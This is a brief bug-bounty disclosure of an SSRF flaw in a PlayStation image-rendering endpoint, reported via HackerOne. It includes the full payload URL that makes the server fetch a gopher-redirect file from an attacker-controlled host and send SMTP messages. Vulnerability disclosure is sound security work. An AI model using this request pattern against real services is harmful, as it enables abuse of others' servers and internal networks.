# SSRF on Image renderer

**Target**: Playstation

**Reported on**: hackerone

**Bug Type**: SSRF

**Severity**: High

**Report URL**: https://hackerone.com/reports/811136

## Summary
The domain `image.api.np.km.playstation.net` allows image urls to be passed via the `image` parameter. It is possible to use this endpoint to send Gopher 
requests that result in SMTP messages being sent out. Create a gopher redirect php file to your attacker server. 
Point the URL to your file location via the image parameter https://image.api.np.km.playstation.net/images/?format=png&image=http%3A%2F%2Fblackdoorsec.net/gopher3.php
On checking the SMTP log you will see a email from an ec2 instance.

## Bounty received ($)
1000

## References
- https://hackerone.com/reports/811136
## Tags
- SSRF
